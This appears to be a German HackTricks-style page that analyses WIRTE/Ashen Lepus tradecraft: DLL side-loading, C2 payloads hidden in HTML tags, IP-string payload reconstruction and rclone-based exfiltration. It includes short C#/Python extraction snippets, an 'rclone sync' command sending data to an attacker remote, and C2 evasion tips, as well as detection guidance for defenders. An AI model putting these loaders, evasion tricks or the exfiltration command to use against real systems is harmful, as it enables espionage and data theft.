# Erweitertes DLL-Side-Loading mit HTML-eingebettetem Payload-Staging

{{#include ../../../banners/hacktricks-training.md}}

## Überblick über die Tradecraft

Ashen Lepus (auch bekannt als WIRTE) setzte ein wiederholbares Muster ein, das DLL-Sideloading, gestaffelte HTML-Payloads und modulare .NET-Backdoors kombiniert, um sich in diplomatischen Netzwerken des Nahen Ostens festzusetzen. Die Technik ist für jeden Operator wiederverwendbar, da sie auf Folgendem beruht:<sup>[[1]](#references)</sup>

- **Archivbasierte Social Engineering**: Harmlose PDFs weisen Ziele an, ein RAR-Archiv von einer Filesharing-Website herunterzuladen. Das Archiv enthält eine echt wirkende EXE-Datei eines Dokument-Viewers, eine bösartige DLL, die nach einer vertrauenswürdigen Bibliothek benannt ist (z. B. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), sowie ein Köder-Dokument `Document.pdf`.
- **Missbrauch der DLL-Suchreihenfolge**: Das Opfer doppelklickt auf die EXE-Datei. Windows löst den DLL-Import aus dem aktuellen Verzeichnis auf, und der bösartige Loader (AshenLoader) wird im vertrauenswürdigen Prozess ausgeführt, während das Köder-PDF geöffnet wird, um keinen Verdacht zu erregen.
- **Staging mit Living-off-the-Land**: Jede spätere Stufe (AshenStager → AshenOrchestrator → Module) wird bis zum benötigten Zeitpunkt von der Festplatte ferngehalten und als verschlüsselte Blobs übermittelt, die in ansonsten harmlosen HTML-Antworten versteckt sind.

## Mehrstufige Side-Loading-Kette

1. **Köder-EXE → AshenLoader**: Die EXE lädt AshenLoader per Side-Loading, der Host-Aufklärung durchführt, die Daten mit AES-CTR verschlüsselt und sie in wechselnden Parametern wie `token=`, `id=`, `q=` oder `auth=` an API-artige Pfade (z. B. `/api/v2/account`) per POST sendet.<sup>[[1]](#references)</sup>
2. **HTML-Extraktion**: Das C2 gibt die nächste Stufe nur preis, wenn die IP-Adresse des Clients der Zielregion zugeordnet wird und der `User-Agent` dem Implantat entspricht, wodurch Sandboxes ausgetrickst werden. Wenn die Prüfungen erfolgreich sind, enthält der HTTP-Body einen `<headerp>...</headerp>`-Blob mit dem Base64/AES-CTR-verschlüsselten AshenStager-Payload.
3. **Zweites Side-Loading**: AshenStager wird mit einer weiteren legitimen Binärdatei bereitgestellt, die `wtsapi32.dll` importiert. Die in die Binärdatei injizierte bösartige Kopie ruft weiteres HTML ab und extrahiert diesmal `<article>...</article>`, um AshenOrchestrator wiederherzustellen.
4. **AshenOrchestrator**: Ein modularer .NET-Controller, der eine Base64-codierte JSON-Konfiguration dekodiert. Die Felder `tg` und `au` der Konfiguration werden verkettet/gehasht und bilden so den AES-Schlüssel, der `xrk` entschlüsselt. Die resultierenden Bytes dienen als XOR-Schlüssel für jeden anschließend abgerufenen Modul-Blob.
5. **Modulbereitstellung**: Jedes Modul wird durch HTML-Kommentare beschrieben, die den Parser zu einem beliebigen Tag umleiten und so statische Regeln umgehen, die nur nach `<headerp>` oder `<article>` suchen. Zu den Modulen gehören Persistenz (`PR*`), Deinstallationsprogramme (`UN*`), Aufklärung (`SN`), Bildschirmaufnahme (`SCT`) und Dateisuche (`FE`).

### HTML-Container-Parsing-Muster

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

Auch wenn Defender ein bestimmtes Element blockieren oder entfernen, muss der Operator lediglich das im HTML-Kommentar angedeutete Tag ändern, um die Auslieferung fortzusetzen.<sup>[[1]](#references)</sup>

### Schneller Extraktionshelfer (Python)

```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```

## Parallelen zur Umgehung bei HTML-Staging

Aktuelle Forschung zu HTML-Smuggling (Talos) hebt Payloads hervor, die als Base64-Zeichenfolgen in `<script>`-Blöcken von HTML-Anhängen verborgen und zur Laufzeit mit JavaScript decodiert werden.<sup>[[2]](#references)</sup> Derselbe Trick lässt sich für C2-Antworten wiederverwenden: Verschlüsselte Blobs in einem Script-Tag (oder einem anderen DOM-Element) ablegen und vor AES/XOR im Arbeitsspeicher decodieren, sodass die Seite wie gewöhnliches HTML aussieht. Talos zeigt außerdem mehrschichtige Verschleierung (Umbenennung von Bezeichnern sowie Base64/Caesar/AES) innerhalb von Script-Tags, die sich problemlos auf HTML-gestagte C2-Blobs übertragen lässt.<sup>[[2]](#references)</sup> Ein späterer Talos-Bericht zu **hidden text salting** ist ebenfalls relevant: Es genügt, Base64 mit irrelevanten HTML-Kommentaren oder Leerraum zu unterbrechen, um einfache Regex-Extraktoren zu umgehen, während die Rekonstruktion im Browser trivial bleibt.<sup>[[7]](#references)</sup>

## Hinweise zu aktuellen Varianten (2024-2025)

- Check Point beobachtete 2024 WIRTE-Kampagnen, die weiterhin auf archivbasiertes Sideloading setzten, aber `propsys.dll` (stagerx64) als erste Stufe verwendeten. Der Stager decodiert die nächste Payload mit Base64 + XOR (Schlüssel `53`), sendet HTTP-Anfragen mit einem fest codierten `User-Agent` und extrahiert verschlüsselte Blobs, die zwischen HTML-Tags eingebettet sind. In einem Zweig wurde die Stufe aus einer langen Liste eingebetteter IP-Zeichenfolgen rekonstruiert, die mit `RtlIpv4StringToAddressA` decodiert und anschließend zu den Payload-Bytes verkettet wurden.<sup>[[3]](#references)</sup>
- OWN-CERT dokumentierte frühere WIRTE-Tools, bei denen der side-loaded `wtsapi32.dll`-Dropper Zeichenfolgen mit Base64 + TEA schützte und den DLL-Namen selbst als Entschlüsselungsschlüssel verwendete. Anschließend wurden Host-Identifikationsdaten mit XOR/Base64 verschleiert, bevor sie an das C2 gesendet wurden.<sup>[[4]](#references)</sup>

## Rekonstruktion von IP-codierten Stufen

WIRTEs `propsys.dll`-Zweig von 2024 zeigt, dass die nächste PE-Datei nicht als einzelner zusammenhängender HTML-Blob vorliegen muss. Der Loader kann die Stage-Bytes als Dotted-Quad-Zeichenfolgen ablegen und sie mit `RtlIpv4StringToAddressA` wieder zusammensetzen – ein Muster, das eng mit Hives **IPfuscation**-Tradecraft verwandt ist.<sup>[[3]](#references)[[5]](#references)</sup> In der Praxis ist das nützlich, wenn der Akteur möchte, dass die HTML-Seite scheinbar harmlose IOCs oder Konfigurationsdaten statt einer offensichtlichen Base64-Payload enthält.

```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```

Wenn die wiederhergestellten Bytes mit `MZ` beginnen, hast du wahrscheinlich direkt das nächste PE rekonstruiert. Falls nicht, prüfe auf eine vorangestellte XOR-/Base64-Schicht oder kleine Trennzeichen zwischen den Adressen.

## Austauschbare DLL-Namen & Host-Rotation

Eine wichtige Eigenschaft dieses Musters ist, dass das **HTML/AES/XOR-Staging-Backend unverändert bleiben kann, während nur das Sideloading-Paar wechselt**. WIRTE verwendete in verschiedenen Kampagnen abwechselnd `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` und `propsys.dll`. Das ist nützlich, weil:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` und `wtsapi32.dll` sind unauffällige Windows-DLL-Namen, von denen Verteidiger erwarten, dass sie unter `%System32%` / `%SysWOW64%` vorhanden sind.
- Öffentliche Kataloge wie **HijackLibs** ordnen bereits viele Binärdateien zu, die diese DLL-Namen aus einem kopierten Anwendungsverzeichnis laden. Dadurch erhalten Angreifer alternative Hosts, ohne den Stager neu entwerfen zu müssen.
- Nur die Exportoberfläche muss für jeden Host angepasst werden. Der HTML-Parser, die AES/XOR-Routinen und der Modul-Loader können in der Regel unverändert in eine Proxy-DLL mit Weiterleitungen übernommen werden.

Für offensive Lab-Arbeit bedeutet das, dass sich das Problem in zwei Teile aufteilen lässt: **(1) einen stabilen, signierten Host finden, der den gewählten DLL-Namen lokal auflöst, und (2) dieselbe Staged-HTML-Loader-Logik hinter dieser DLL wiederverwenden**.

## Härtung von Crypto & C2

- **AES-CTR überall**: Aktuelle Loader betten 256-Bit-Schlüssel sowie Nonces ein (z. B. `{9a 20 51 98 ...}`) und fügen vor oder nach der Entschlüsselung optional eine XOR-Schicht mit Zeichenfolgen wie `msasn1.dll` hinzu.<sup>[[1]](#references)</sup>
- **Variationen des Schlüsselmaterials**: Ältere Loader verwendeten Base64 + TEA, um eingebettete Zeichenfolgen zu schützen. Der Entschlüsselungsschlüssel wurde dabei aus dem Namen der bösartigen DLL abgeleitet (z. B. `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Trennung der Infrastruktur + Tarnung durch Subdomains**: Staging-Server sind je nach Tool getrennt, werden über verschiedene ASNs gehostet und mitunter durch legitim wirkende Subdomains verschleiert. So legt die Kompromittierung einer Stage nicht den Rest offen.
- **Einschleusen von Recon-Daten**: Die aufgezählten Daten umfassen nun auch Program-Files-Verzeichnisse, um hochwertige Anwendungen zu erkennen, und werden vor dem Verlassen des Hosts immer verschlüsselt.
- **URI-Wechsel**: Abfrageparameter und REST-Pfade ändern sich zwischen Kampagnen (`/api/v1/account?token=` → `/api/v2/account?auth=`), wodurch anfällige Erkennungsregeln unwirksam werden.
- **Festgelegter User-Agent + sichere Weiterleitungen**: Die C2-Infrastruktur antwortet nur auf exakte UA-Zeichenfolgen und leitet andernfalls auf harmlose Nachrichten- oder Gesundheitsseiten weiter, um nicht aufzufallen.
- **Gesteuerte Auslieferung**: Server sind geografisch eingeschränkt und antworten nur echten Implantaten. Nicht autorisierte Clients erhalten unauffälliges HTML.

## Persistenz- und Ausführungsschleife

AshenStager legt geplante Tasks an, die sich als Windows-Wartungsaufgaben tarnen und über `svchost.exe` ausgeführt werden, z. B.:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Diese Tasks starten die Sideloading-Kette beim Systemstart oder in regelmäßigen Abständen erneut. So kann AshenOrchestrator neue Module anfordern, ohne erneut auf die Festplatte zuzugreifen.

## Nutzung legitimer Sync-Clients für Exfiltration

Angreifer legen diplomatische Dokumente mithilfe eines dedizierten Moduls unter `C:\Users\Public` ab (für alle lesbar und unauffällig) und laden dann die legitime [Rclone](https://rclone.org/)-Binärdatei herunter, um dieses Verzeichnis mit einem vom Angreifer kontrollierten Speicher zu synchronisieren. Laut Unit42 ist dies das erste Mal, dass dieser Akteur bei der Exfiltration mit Rclone beobachtet wurde. Das entspricht dem allgemeinen Trend, legitime Sync-Tools zu missbrauchen, um sich in normalen Datenverkehr einzufügen:<sup>[[1]](#references)</sup>

1. **Bereitstellen**: Zieldateien nach `C:\Users\Public\{campaign}\` kopieren/sammeln.
2. **Konfigurieren**: Eine Rclone-Konfiguration bereitstellen, die auf einen vom Angreifer kontrollierten HTTPS-Endpunkt verweist (z. B. `api.technology-system[.]com`).
3. **Synchronisieren**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` ausführen, damit der Datenverkehr wie gewöhnliche Cloud-Backups aussieht.

Da Rclone häufig für legitime Backup-Abläufe verwendet wird, müssen Verteidiger auf ungewöhnliche Ausführungen achten (neue Binärdateien, auffällige Remotes oder plötzliche Synchronisierungen von `C:\Users\Public`).

## Erkennungsansätze

- Auf **signierte Prozesse** aufmerksam machen, die unerwartet DLLs aus benutzerschreibbaren Pfaden laden (Procmon-Filter + `Get-ProcessMitigation -Module`), insbesondere wenn die DLL-Namen `netutils`, `srvcli`, `dwampi`, `wtsapi32` oder `propsys` enthalten.<sup>[[6]](#references)</sup>
- Verdächtige HTTPS-Antworten auf **große Base64-Blobs in ungewöhnlichen Tags** oder auf Kommentare wie `<!-- TAG: <xyz> -->` prüfen.
- HTML zuerst normalisieren: **Kommentare entfernen und Leerraum reduzieren, bevor Base64 extrahiert wird**, da eine Umgehungstechnik mit versteckten Texten Payloads über Kommentargrenzen hinweg aufteilen kann.
- Die HTML-Suche auf **Base64-Zeichenfolgen in `<script>`-Blöcken** ausweiten (Staging im Stil von HTML smuggling), die vor der AES/XOR-Verarbeitung per JavaScript dekodiert werden.
- Nach wiederholten Aufrufen von **`RtlIpv4StringToAddressA` gefolgt von Buffer-Zusammenbau** suchen, insbesondere wenn die umgebenden Zeichenfolgen lange IPv4-Listen statt echter Netzwerkziele sind.
- Nach **geplanten Tasks** suchen, die `svchost.exe` mit Argumenten ausführen, die nicht zu einem Dienst gehören, oder auf Dropper-Verzeichnisse verweisen.
- **C2-Weiterleitungen** nachverfolgen, die Payloads nur bei exakten `User-Agent`-Zeichenfolgen zurückgeben und andernfalls auf legitime Nachrichten- oder Gesundheitsdomains weiterleiten.
- Auf **Rclone**-Binärdateien außerhalb von IT-verwalteten Speicherorten, neue `rclone.conf`-Dateien oder Sync-Jobs achten, die Daten aus Staging-Verzeichnissen wie `C:\Users\Public` abrufen.

## References

- [1] [Ashen Lepus mit Hamas-Bezug zielt mit neuer AshTag-Malware-Suite auf diplomatische Einrichtungen im Nahen Osten](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Zwischen den Tags verborgen: Einblicke in Umgehungstechniken beim HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Der Hamas-nahe Bedrohungsakteur WIRTE setzt seine Operationen im Nahen Osten fort und wechselt zu störenden Aktivitäten](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: Auf der Suche nach verlorener Zeit](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware setzt neuartige IPfuscation-Technik ein, um Erkennung zu vermeiden](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Mögliches Sideloading von System-DLLs aus Nicht-Systempfaden](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [E-Mail-Bedrohungen mit verstecktem Text-Salting würzen](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
{{#include ../../../banners/hacktricks-training.md}}
